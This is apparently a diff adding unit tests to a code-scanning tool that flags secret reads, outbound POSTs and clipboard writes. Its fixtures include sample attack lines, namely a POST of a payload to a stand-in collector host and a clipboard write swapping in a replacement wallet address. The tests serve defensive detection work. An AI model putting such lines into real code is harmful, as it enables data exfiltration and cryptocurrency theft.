@@ -99,3 +99,33 @@ def test_explicit_auth_storage_key_is_still_flagged():
     code = 'localStorage.setItem("github_auth_token", token)'
     findings = scan_text("owner/repo", "app.js", code)
     assert "BROWSER_STORAGE_TOKEN" in ids(findings)
+
+def test_expected_github_token_environment_access_is_not_a_finding():
+    code = 'token = os.getenv("GITHUB_TOKEN")'
+    assert "ENV_SECRET_READ" not in ids(scan_text("owner/repo", "client.py", code))
+
+
+def test_other_sensitive_environment_access_remains_flagged():
+    code = 'key = os.getenv("PRIVATE_KEY")'
+    assert "ENV_SECRET_READ" in ids(scan_text("owner/repo", "client.py", code))
+
+
+def test_same_origin_post_is_not_reported_as_outbound_networking():
+    code = 'fetch("/api/audit", { method: "POST", body: JSON.stringify({target}) })'
+    assert "OUTBOUND_POST" not in ids(scan_text("owner/repo", "app.js", code))
+
+
+def test_external_post_remains_flagged():
+    code = 'fetch("https://collector.example.invalid", { method: "POST", body: payload })'
+    assert "OUTBOUND_POST" in ids(scan_text("owner/repo", "app.js", code))
+
+
+def test_plain_share_clipboard_helper_is_not_reported_as_clipboard_write_risk():
+    code = 'async function gtaCopy(text){await navigator.clipboard.writeText(text)}'
+    assert "CLIPBOARD_WRITE" not in ids(scan_text("owner/repo", "share.js", code))
+
+
+def test_wallet_address_clipboard_write_remains_flagged():
+    code = 'navigator.clipboard.writeText(replacementWalletAddress)'
+    assert "CLIPBOARD_WRITE" in ids(scan_text("owner/repo", "wallet.js", code))
+
